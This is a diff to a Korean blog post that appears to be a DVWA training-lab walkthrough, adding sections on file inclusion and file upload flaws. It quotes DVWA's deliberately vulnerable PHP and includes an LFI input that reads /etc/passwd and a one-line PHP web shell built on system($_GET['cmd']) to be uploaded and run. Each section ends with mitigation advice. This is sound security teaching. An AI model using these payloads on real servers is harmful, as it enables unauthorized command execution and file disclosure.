@@ -605,6 +605,82 @@ else:
 </li>
 </ol>
 <hr>
+<h3 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h3><p>File Inclusion이란, LFI(Local FIle Include)와 동일한 개념이라고 생각하면 됩니다.</p>
+<p>즉, 로컬 저장소에 저장된 파일을 페이지에서 불러올 수 있는 취약점입니다.</p>
+<img src="/img/post/dvwa/lfi.png" class="lazyload" data-srcset="/img/post/dvwa/lfi.png" srcset="data:image/png;base64,666">
+
+<pre><code class="php">&lt;?php
+
+// The page we wish to display
+$file = $_GET[ &#39;page&#39; ];
+
+?&gt;</code></pre>
+<p>low 레벨에서는 소스코드가 매우 간단합니다.  page 파라미터를 넘겨받아서 그대로 페이지에 include 해주는 로직입니다.</p>
+<p>그럼 여기서, 페이지에 나와있는 file1, fil2, file3.php는 당연히 로컬 서버의 저장소에 저장이 되어 있겠죠?</p>
+<p>이런 점을 생각해서 다른 로컬 파일들을 읽어오면 됩니다.</p>
+<pre><code class="bash">?page=/etc/passwd
+?page=/etc/~~
+...</code></pre>
+<p>LFI를 활용해서는 php 설정 옵션인 <code> allow_url_include </code>가 ON으로 되어 있을 경우</p>
+<p>RFI(Remote File Inclusion) 외부 URL를 읽어서 페이지에 로드하는 것도 가능합니다.</p>
+<p>이에 대해서는 DVWA 리뷰가 아닌 LFI &amp; RCE 라는 주제로 새 포스팅에서 다뤄볼 예정입니다.</p>
+<hr>
+<h3 id="File-Inclusion-대응-방안"><a href="#File-Inclusion-대응-방안" class="headerlink" title="File Inclusion(대응 방안)"></a>File Inclusion(대응 방안)</h3><ol>
+<li><p>php를 사용할 때 외부 파일을 로드하지 못하도록 allow_url_include, url_fopen 옵션 OFF</p>
+</li>
+<li><p>입력값 필터링(preg_match, regex 등)</p>
+</li>
+<li><p>특정 디렉토리에서만 파일을 읽어올 수 있도록 조치</p>
+</li>
+</ol>
+<hr>
+<h3 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h3><p>파일 업로드(File Upload) 취약점을 다루는 페이지입니다.</p>
+<p>파일 업로드 취약점은 웹 애플리케이션 내 서버에 파일을 업로드 하는 기능이 있을 때 업로드 하는 파일에 대한 검사를 하지 않고</p>
+<p>서버에 다이렉트로 업로드 되는 경우 공격자가 “웹쉘”, “악성파일” 등을 업로드하여 서버에 접근할 수 있는 취약점 입니다.</p>
+<img src="/img/post/dvwa/upload.png" class="lazyload" data-srcset="/img/post/dvwa/upload.png" srcset="data:image/png;base64,666">
+
+<pre><code class="php">&lt;?php
+
+if( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123;
+    // Where are we going to be writing to?
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;
+    $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );
+
+    // Can we move the file to the upload folder?
+    if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) &#123;
+        // No
+        echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;
+    &#125;
+    else &#123;
+        // Yes!
+        echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;
+    &#125;
+&#125;
+
+?&gt;</code></pre>
+<p>코드도 매우 간단합니다. (low 레벨이라. ㅎㅎ) 사용자로 부터 업로드할 파일을 받아서</p>
+<p>DVWA ROOT 경로 -&gt; hackable/uploads 폴더에 파일을 업로드하도록 되어 있네요.</p>
+<p>이 과정에서 파일에 대한 검증 로직이 없기 때문에 위에서 언급했던 웹쉘 업로드가 가능합니다.</p>
+<pre><code class="php">&lt;?php
+    system($_GET[&#39;cmd&#39;]);
+?&gt;</code></pre>
+<p>시스템 함수를 사용하여 웹쉘을 만들어주고, 업로드 하면 됩니다.</p>
+<p>저는 shell.php 라는 파일명으로 업로드 하였을 때 (hackable/uploads/shell.php)로 저장이 됩니다.</p>
+<p>그럼 이제 해당 경로로 가서 웹쉘을 실행시켜봅시다.</p>
+<img src="/img/post/dvwa/upload_result.png" class="lazyload" data-srcset="/img/post/dvwa/upload_result.png" srcset="data:image/png;base64,666">
+
+<hr>
+<h3 id="File-Upload-대응-방안"><a href="#File-Upload-대응-방안" class="headerlink" title="File Upload (대응 방안)"></a>File Upload (대응 방안)</h3><ol>
+<li><p>업로드 하는 파일의 확장자 검사 또는 화이트 리스트 적용(jpg, png, gif 등)</p>
+</li>
+<li><p>파일 실행권한(x) 제거</p>
+</li>
+<li><p>업로드 시에 파일 경로/파일 명을 알 수 없도록 난독화하여 저장</p>
+</li>
+<li><p>특수문자 필터링</p>
+</li>
+</ol>
+<hr>
 
   
   
@@ -710,7 +786,7 @@ else:
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Intro"><span class="toc-number">1.</span> <span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-Force"><span class="toc-number">2.</span> <span class="toc-text">Brute Force</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-Force-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">3.</span> <span class="toc-text">Brute Force (대응 방안)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-Injection"><span class="toc-number">4.</span> <span class="toc-text">Command Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-Injection-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">5.</span> <span class="toc-text">Command Injection(대응 방안)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF"><span class="toc-number">6.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">7.</span> <span class="toc-text">CSRF (대응 방안)</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Intro"><span class="toc-number">1.</span> <span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-Force"><span class="toc-number">2.</span> <span class="toc-text">Brute Force</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-Force-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">3.</span> <span class="toc-text">Brute Force (대응 방안)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-Injection"><span class="toc-number">4.</span> <span class="toc-text">Command Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-Injection-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">5.</span> <span class="toc-text">Command Injection(대응 방안)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF"><span class="toc-number">6.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">7.</span> <span class="toc-text">CSRF (대응 방안)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Inclusion"><span class="toc-number">8.</span> <span class="toc-text">File Inclusion</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Inclusion-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">9.</span> <span class="toc-text">File Inclusion(대응 방안)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Upload"><span class="toc-number">10.</span> <span class="toc-text">File Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Upload-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">11.</span> <span class="toc-text">File Upload (대응 방안)</span></a></li></ol>
     </div>
   </section>
 
